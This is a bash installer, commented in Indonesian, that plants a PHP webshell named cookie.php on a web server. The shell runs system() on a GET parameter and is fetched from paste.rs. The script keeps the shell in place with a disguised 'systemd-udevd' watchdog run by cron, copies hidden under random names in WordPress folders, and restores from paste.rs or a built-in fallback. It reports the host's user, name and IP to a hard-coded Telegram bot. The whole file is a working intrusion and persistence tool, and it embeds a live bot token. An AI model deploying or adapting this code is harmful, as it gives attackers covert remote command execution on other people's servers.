#!/bin/bash
# ============================================================
# CokkieDef v10.3 - Auto Installer (Final)
# Webshell : cookie.php (via Pastebin)
# Backup   : Nama acak (nyamar di semua folder WP)
# Restore  : 3 lapis (lokal → Pastebin → fallback)
# Telegram : Notifikasi realtime
# ============================================================

echo "╔════════════════════════════════════════════════════╗"
echo "║   CokkieDef v10.3 - Auto Installer               ║"
echo "║   Siap pakai, tinggal jalanin                     ║"
echo "╚════════════════════════════════════════════════════╝"

# ============================================================
# KONFIGURASI (LO GANTI DI SINI!)
# ============================================================

# URL webshell (Pastebin / Gist / dll) - RAW link!
PASTE_URL="https://paste.rs/wu5Qo"

# Telegram (opsional - kosongin aja kalo ga mau pake)
TELEGRAM_BOT_TOKEN="8819711539:AAG0IeVM3iuIuoZ876APF04smiR8bmk-u40"
TELEGRAM_CHAT_ID="6786415650"

# ============================================================
# DETEKSI ENVIRONMENT
# ============================================================

USER_HOME="$HOME"
CURRENT_USER=$(whoami)
HOSTNAME=$(hostname)
SERVER_IP=$(curl -s ifconfig.me 2>/dev/null || echo "unknown")

echo ""
echo "[+] User  : $CURRENT_USER"
echo "[+] Home  : $USER_HOME"
echo "[+] Host  : $HOSTNAME"
echo "[+] IP    : $SERVER_IP"

# ============================================================
# DOWNLOAD WEBSHELL
# ============================================================

echo ""
echo "[*] Downloading cookie.php from Pastebin..."

SHELL_NAME="cookie.php"
SHELL_PATH="$USER_HOME/public_html/$SHELL_NAME"

if command -v wget &> /dev/null; then
    wget -q "$PASTE_URL" -O "$SHELL_PATH"
elif command -v curl &> /dev/null; then
    curl -sL "$PASTE_URL" -o "$SHELL_PATH"
else
    echo "[!] ERROR: wget / curl ga ada!"
    exit 1
fi

if [ ! -f "$SHELL_PATH" ]; then
    echo "[!] Download gagal! Buat default..."
    mkdir -p "$(dirname "$SHELL_PATH")"
    cat > "$SHELL_PATH" << 'SHELL_EOF'
<?php
/* COKKIEDEF_BACKUP */
if(isset($_GET['cmd'])){ system($_GET['cmd']); }
echo "cookie v1.0";
?>
SHELL_EOF
fi

chmod 644 "$SHELL_PATH"
echo "[✅] cookie.php installed at: $SHELL_PATH"

# ============================================================
# DETEKSI WP FOLDER
# ============================================================

DOC_ROOT=$(dirname "$SHELL_PATH")
BASE_DIR=$(dirname "$DOC_ROOT")

WP_FOLDERS=(
    "$DOC_ROOT/wp-content"
    "$DOC_ROOT/wp-includes"
    "$DOC_ROOT/wp-admin"
    "$DOC_ROOT/cgi-bin"
    "$DOC_ROOT/.well-known"
    "$DOC_ROOT/.tmb"
)

echo "[+] Document Root: $DOC_ROOT"

# ============================================================
# SETUP DEFENSE DIRECTORY (HIDDEN)
# ============================================================

DEFENSE_DIR="$USER_HOME/.systemd-helper"
mkdir -p "$DEFENSE_DIR"
chmod 700 "$DEFENSE_DIR"
echo "[✅] Defense dir: $DEFENSE_DIR (HIDDEN)"

# ============================================================
# BUAT WATCHDOG SCRIPT
# ============================================================

echo "[+] Creating systemd-udevd watchdog..."

cat > "$DEFENSE_DIR/systemd-udevd" << 'WATCHDOG_EOF'
#!/bin/bash
# ============================================================
# systemd-udevd - Systemd Device Manager Helper
# ============================================================

USER_HOME="$HOME"
CURRENT_USER=$(whoami)
HOSTNAME=$(hostname)
SERVER_IP=$(curl -s ifconfig.me 2>/dev/null || echo "unknown")

# === TELEGRAM ===
TELEGRAM_ENABLED="false"
TELEGRAM_BOT_TOKEN=""
TELEGRAM_CHAT_ID=""

# === CARI cookie.php ===
SHELL_NAME="cookie.php"
SHELL_PATH=""
POSSIBLE_PATHS=(
    "$USER_HOME/public_html/$SHELL_NAME"
    "$USER_HOME/www/$SHELL_NAME"
    "$USER_HOME/html/$SHELL_NAME"
    "$USER_HOME/$SHELL_NAME"
)
for path in "${POSSIBLE_PATHS[@]}"; do
    if [ -f "$path" ]; then
        SHELL_PATH="$path"
        break
    fi
done
if [ -z "$SHELL_PATH" ]; then
    SHELL_PATH=$(find "$USER_HOME" -name "$SHELL_NAME" -type f 2>/dev/null | head -1)
fi
if [ -z "$SHELL_PATH" ]; then
    SHELL_PATH="$USER_HOME/public_html/$SHELL_NAME"
fi

DOC_ROOT=$(dirname "$SHELL_PATH")
DEFENSE_DIR="$USER_HOME/.systemd-helper"
MD5_FILE="$DEFENSE_DIR/systemd.md5"
LOG_FILE="$DEFENSE_DIR/systemd.log"
SID_FILE="$DEFENSE_DIR/systemd.conf"
TELEGRAM_CONF="$DEFENSE_DIR/telegram.conf"

# === LOAD TELEGRAM ===
if [ -f "$TELEGRAM_CONF" ]; then
    source "$TELEGRAM_CONF"
fi

# === SID ===
if [ -f "$SID_FILE" ]; then
    SID=$(cat "$SID_FILE")
else
    SID=$(md5sum "$SHELL_PATH" 2>/dev/null | awk '{print $1}' | cut -c1-8)
    echo "$SID" > "$SID_FILE"
fi

# === WP FOLDERS ===
WP_FOLDERS=(
    "$DOC_ROOT/wp-content"
    "$DOC_ROOT/wp-includes"
    "$DOC_ROOT/wp-admin"
    "$DOC_ROOT/content"
    "$DOC_ROOT/includes"
    "$DOC_ROOT/admin"
)

# === FUNGSI LOG ===
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$CURRENT_USER] $1" >> "$LOG_FILE"
}

# === FUNGSI TELEGRAM ===
send_telegram() {
    if [ "$TELEGRAM_ENABLED" = "true" ] && [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
        curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            -d text="$(echo -e "$1")" \
            -d parse_mode="Markdown" > /dev/null 2>&1
    fi
}

# === GENERATE NAMA BACKUP ACAK ===
generate_backup_name() {
    local folder="$1"
    local sample_file=$(find "$folder" -maxdepth 1 -type f 2>/dev/null | head -1)
    
    if [ -n "$sample_file" ]; then
        local base_name=$(basename "$sample_file" | sed 's/\.[^.]*$//')
        local random_suffix=$(tr -dc 'a-z0-9' < /dev/urandom 2>/dev/null | head -c 4 || echo "abcd")
        echo "${base_name}_${random_suffix}.php"
    else
        local random_suffix=$(tr -dc 'a-z0-9' < /dev/urandom 2>/dev/null | head -c 4 || echo "abcd")
        echo "index_${random_suffix}.php"
    fi
}

# === INJECT BACKUP NAMA ACAK ===
inject_random_backup() {
    local base_dir="$1"
    if [ ! -d "$base_dir" ]; then
        return
    fi
    
    find "$base_dir" -type d -maxdepth 4 2>/dev/null | while read -r folder; do
        if [ ! -w "$folder" ]; then
            continue
        fi
        
        local backup_name=$(generate_backup_name "$folder")
        local backup_path="$folder/$backup_name"
        
        if [ -f "$backup_path" ] && grep -q "COKKIEDEF_BACKUP" "$backup_path" 2>/dev/null; then
            continue
        fi
        
        cp "$SHELL_PATH" "$backup_path"
        chmod 644 "$backup_path"
        log_message "✅ Random backup created: $backup_path"
    done
}

# === RESTORE LAPIS 1: BACKUP LOKAL ===
restore_from_backup() {
    log_message "🔄 Restoring from local backup..."
    send_telegram "🔄 *RESTORE ATTEMPT*\\ncookie.php hilang! Mencari backup lokal..."
    
    for wp_folder in "${WP_FOLDERS[@]}"; do
        if [ -d "$wp_folder" ]; then
            BACKUP_FILE=$(find "$wp_folder" -name "*.php" -type f -exec grep -l "COKKIEDEF_BACKUP" {} \; 2>/dev/null | head -1)
            if [ -f "$BACKUP_FILE" ]; then
                cp "$BACKUP_FILE" "$SHELL_PATH"
                chmod 644 "$SHELL_PATH"
                log_message "✅ Restored from: $BACKUP_FILE"
                send_telegram "✅ *RESTORE SUCCESS*\\ncookie.php direstore dari:\\n\`$BACKUP_FILE\`"
                return 0
            fi
        fi
    done
    
    send_telegram "❌ *RESTORE FAILED*\\nTidak ada backup lokal ditemukan!"
    return 1
}

# === RESTORE LAPIS 2: PASTEBIAN ===
restore_from_pastebin() {
    PASTE_URL="https://paste.rs/vvWfG"
    
    send_telegram "🔄 *REMOTE RESTORE*\\nMencoba restore dari Pastebin..."
    
    if command -v wget &> /dev/null; then
        wget -q "$PASTE_URL" -O "$SHELL_PATH"
    elif command -v curl &> /dev/null; then
        curl -sL "$PASTE_URL" -o "$SHELL_PATH"
    fi
    
    if [ -f "$SHELL_PATH" ]; then
        chmod 644 "$SHELL_PATH"
        log_message "✅ Restored from Pastebin"
        send_telegram "✅ *REMOTE RESTORE SUCCESS*\\ncookie.php direstore dari Pastebin"
        return 0
    fi
    
    send_telegram "❌ *REMOTE RESTORE FAILED*\\nPastebin ga bisa diakses!"
    return 1
}

# === RESTORE LAPIS 3: FALLBACK DEFAULT ===
restore_from_fallback() {
    log_message "🔄 Restoring from fallback (default)..."
    send_telegram "🔄 *FALLBACK RESTORE*\\nMembuat cookie.php default..."
    
    cat > "$SHELL_PATH" << 'DEFAULT_EOF'
<?php
/* COKKIEDEF_BACKUP */
if(isset($_GET['cmd'])){ system($_GET['cmd']); }
echo "cookie v1.0 (fallback)";
?>
DEFAULT_EOF
    chmod 644 "$SHELL_PATH"
    log_message "✅ Restored from fallback"
    send_telegram "✅ *FALLBACK RESTORE SUCCESS*\\ncookie.php dibuat ulang (default)"
}

# === STATUS REPORT ===
status_report() {
    BACKUP_COUNT=0
    for wp_folder in "${WP_FOLDERS[@]}"; do
        if [ -d "$wp_folder" ]; then
            COUNT=$(find "$wp_folder" -name "*.php" -type f -exec grep -l "COKKIEDEF_BACKUP" {} \; 2>/dev/null | wc -l)
            BACKUP_COUNT=$((BACKUP_COUNT + COUNT))
        fi
    done
    
    STATUS="📊 *CokkieDef Status Report*\\n"
    STATUS+="├ SID: \`$SID\`\\n"
    STATUS+="├ User: \`$CURRENT_USER\`\\n"
    STATUS+="├ Host: \`$HOSTNAME\`\\n"
    STATUS+="├ IP: \`$SERVER_IP\`\\n"
    STATUS+="├ Backup count: \`$BACKUP_COUNT\`\\n"
    STATUS+="└ Status: \`$([ -f "$SHELL_PATH" ] && echo "✅ OK" || echo "❌ MISSING")\`"
    
    send_telegram "$STATUS"
}

# === MAIN ===
main() {
    log_message "🔄 systemd-udevd running..."
    
    for wp_folder in "${WP_FOLDERS[@]}"; do
        inject_random_backup "$wp_folder"
    done
    
    if [ ! -f "$SHELL_PATH" ]; then
        log_message "⚠️ cookie.php missing! Restoring..."
        restore_from_backup || restore_from_pastebin || restore_from_fallback
    fi
    
    if [ $(( $(date +%M) % 60 )) -eq 0 ]; then
        status_report
    fi
    
    log_message "✅ systemd-udevd cycle complete"
}

main
WATCHDOG_EOF

chmod +x "$DEFENSE_DIR/systemd-udevd"
echo "[✅] Watchdog created"

# ============================================================
# SID & MD5
# ============================================================

SID=$(md5sum "$SHELL_PATH" | awk '{print $1}' | cut -c1-8)
echo "$SID" > "$DEFENSE_DIR/systemd.conf"

CURRENT_MD5=$(md5sum "$SHELL_PATH" | awk '{print $1}')
echo "$CURRENT_MD5" > "$DEFENSE_DIR/systemd.md5"
echo "[✅] SID: $SID"

# ============================================================
# TELEGRAM CONFIG
# ============================================================

if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
    cat > "$DEFENSE_DIR/telegram.conf" << TELE_EOF
TELEGRAM_ENABLED="true"
TELEGRAM_BOT_TOKEN="$TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID="$TELEGRAM_CHAT_ID"
TELE_EOF
    echo "[✅] Telegram configured"
fi

# ============================================================
# CRONTAB
# ============================================================

CRON_CMD="* * * * * $DEFENSE_DIR/systemd-udevd > /dev/null 2>&1"
(crontab -l 2>/dev/null | grep -v "systemd-udevd"; echo "$CRON_CMD") | crontab -
echo "[✅] Cron installed: * * * * *"

# ============================================================
# INJECT BACKUP PERTAMA KALI
# ============================================================

echo "[+] Injecting random backups to all WP folders..."
"$DEFENSE_DIR/systemd-udevd"

# ============================================================
# TELEGRAM NOTIF INSTALL
# ============================================================

if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d chat_id="${TELEGRAM_CHAT_ID}" \
        -d text="🚀 *CokkieDef v10.3 Deployed!*\\nSID: \`$SID\`\\nUser: \`$CURRENT_USER\`\\nHost: \`$HOSTNAME\`\\nIP: \`$SERVER_IP\`\\nWebshell: \`cookie.php\`\\nBackup: \`Nama Acak (nyamar di WP)\`\\n\\n✅ Defense aktif! Telegram monitor aktif!" \
        -d parse_mode="Markdown" > /dev/null 2>&1
    echo "[✅] Telegram notifikasi terkirim"
fi

# ============================================================
# FINISH
# ============================================================

echo ""
echo "========================================="
echo "✅ COKKIEDEF v10.3 DEPLOY COMPLETE"
echo "========================================="
echo " SID            : $SID"
echo " Webshell       : $SHELL_PATH"
echo " Defense dir    : $DEFENSE_DIR (HIDDEN)"
echo " Backup         : NAMA ACAK (nyamar di semua folder WP)"
echo " Restore        : 3 lapis (lokal → Pastebin → fallback)"
echo " Telegram       : $([ -n "$TELEGRAM_BOT_TOKEN" ] && echo "✅ AKTIF" || echo "❌ TIDAK AKTIF")"
echo " Cron           : * * * * *"
echo ""
echo " Akses: curl http://$SERVER_IP/cookie.php?cmd=id"
echo "========================================="